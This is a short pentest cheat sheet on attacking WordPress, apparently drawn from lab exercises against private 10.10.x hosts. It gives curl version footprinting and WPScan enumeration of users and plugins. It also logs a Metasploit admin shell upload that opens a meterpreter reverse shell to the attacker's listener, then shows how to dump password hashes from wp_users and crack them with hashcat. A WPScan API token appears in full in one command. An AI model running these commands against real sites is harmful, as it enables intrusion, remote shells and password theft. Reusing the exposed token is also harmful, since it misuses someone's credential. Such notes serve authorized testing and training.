# Attacking Wordpress

- [Footprinting](#footprinting)
- [WPScan](#wpscan)
- [Metasploit](#metasploit)

## Footprinting

Look for meta generator tag in HTML source:

```
<meta name="generator" content="WordPress 5.3.3" />
```

or:

```
# curl -s -X GET  http://10.10.11.125 | grep '<meta name="generator"'
<meta name="generator" content="WordPress 5.8.1" />
```


## WPScan

First, update:

```
# wpscan --update
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.
```

Then, enumerate with our API key:

```
# wpscan --url http://10.10.11.125 --enumerate --api-token vYvrH7HT2y...
```

Enumerate users:

```
# wpscan  --url http://10.10.11.125 -e u --api-token vYvrH7HT2yKLSaLG5K51f6HGFZzdga...
```

Enmerate plugins:

```
# wpscan  --url http://10.10.11.125 -e ap --api-token vYvrH7HT2yKLSaLG5K51f6HGFZzdgabos8zElrpAHbY
```

## Metasploit

(Require authentication)

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD P4ssword
PASSWORD => P4ssword
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 10.10.10.37
RHOSTS => 10.10.10.37
msf6 exploit(unix/webapp/wp_admin_shell_upload) > options

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set LHOST tun0
LHOST => tun0
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.14.5:4444
[*] Authenticating with WordPress using admin:P4ssword...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/vuJOXoEGoO/ALFTyZjtAc.php...
[*] Sending stage (39282 bytes) to 10.10.10.37
[+] Deleted ALFTyZjtAc.php
[+] Deleted vuJOXoEGoO.php
[+] Deleted ../vuJOXoEGoO
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.37:46268) at 2021-07-10 12:04:31 +0200
```

cracking password:

```
select concat_ws(':', user_login, user_pass) from wp_users;
```

hashcat (put ONLY hash in file):

```
D:\tmrc\tools\hashcat-6.0.0>hashcat.exe -O -m 400 -a 0 -o notch_cracked.txt notch.txt d:\tmrc\hacking\wordlist\rockyou.txt
```
